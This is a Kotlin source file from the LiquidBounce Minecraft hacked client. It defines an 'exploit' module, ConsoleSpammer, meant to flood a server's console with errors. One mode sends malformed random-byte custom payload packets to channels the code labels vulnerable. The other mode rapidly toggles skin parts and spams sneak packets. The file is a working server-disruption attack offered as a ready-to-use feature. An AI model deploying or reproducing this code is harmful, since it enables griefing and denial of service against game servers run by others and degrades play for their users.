/*
 * LiquidBounce Hacked Client
 * A free open source mixin-based injection hacked client for Minecraft using Minecraft Forge.
 * https://github.com/CCBlueX/LiquidBounce/
 */
package net.ccbluex.liquidbounce.features.module.modules.exploit

import io.netty.buffer.Unpooled
import net.ccbluex.liquidbounce.api.minecraft.client.entity.player.WEnumPlayerModelParts
import net.ccbluex.liquidbounce.api.minecraft.network.play.client.ICPacketEntityAction
import net.ccbluex.liquidbounce.event.EventTarget
import net.ccbluex.liquidbounce.event.UpdateEvent
import net.ccbluex.liquidbounce.event.WorldEvent
import net.ccbluex.liquidbounce.features.module.Module
import net.ccbluex.liquidbounce.features.module.ModuleCategory
import net.ccbluex.liquidbounce.features.module.ModuleInfo
import net.ccbluex.liquidbounce.utils.timer.MSTimer
import net.ccbluex.liquidbounce.value.IntegerValue
import net.ccbluex.liquidbounce.value.ListValue
import kotlin.random.Random

@ModuleInfo(name = "ConsoleSpammer", description = "Spams the console of the server with errors.", category = ModuleCategory.EXPLOIT)
class ConsoleSpammer : Module()
{
	private val modeValue = ListValue("Mode", arrayOf("Payload", "MineSecure"), "Payload")
	private val delayValue = IntegerValue("Delay", 0, 0, 500)

	private val payload = classProvider.createPacketBuffer(Unpooled.buffer())
	private val vulnerableChannels = arrayOf("MC|BEdit", "MC|BSign", "MC|TrSel", "MC|PickItem")
	private val timer = MSTimer()

	init
	{
		val rawPayload = ByteArray(Random.nextInt(128))
		Random.nextBytes(rawPayload)
		payload.writeBytes(rawPayload)
	}

	@EventTarget
	fun onUpdate(event: UpdateEvent)
	{
		if (!timer.hasTimePassed(delayValue.get().toLong())) return

		when (modeValue.get().toLowerCase())
		{
			"payload" -> mc.netHandler.addToSendQueue(classProvider.createCPacketCustomPayload(vulnerableChannels[Random.nextInt(vulnerableChannels.size)], payload))

			"minesecure" ->
			{
				val player = mc.thePlayer ?: return

				mc.gameSettings.setModelPartEnabled(WEnumPlayerModelParts.HAT, Random.nextBoolean())
				mc.gameSettings.setModelPartEnabled(WEnumPlayerModelParts.JACKET, Random.nextBoolean())
				mc.gameSettings.setModelPartEnabled(WEnumPlayerModelParts.LEFT_PANTS_LEG, Random.nextBoolean())
				mc.gameSettings.setModelPartEnabled(WEnumPlayerModelParts.RIGHT_PANTS_LEG, Random.nextBoolean())
				mc.gameSettings.setModelPartEnabled(WEnumPlayerModelParts.LEFT_SLEEVE, Random.nextBoolean())
				mc.gameSettings.setModelPartEnabled(WEnumPlayerModelParts.RIGHT_SLEEVE, Random.nextBoolean())

				repeat(5) {
					mc.netHandler.addToSendQueue(classProvider.createCPacketEntityAction(player, ICPacketEntityAction.WAction.STOP_SNEAKING))
					mc.netHandler.addToSendQueue(classProvider.createCPacketEntityAction(player, ICPacketEntityAction.WAction.START_SNEAKING))
				}
			}
		}
	}

	@EventTarget
	fun onWorld(event: WorldEvent)
	{
		if (event.worldClient == null)
		{
			state = false
		}
	}
}
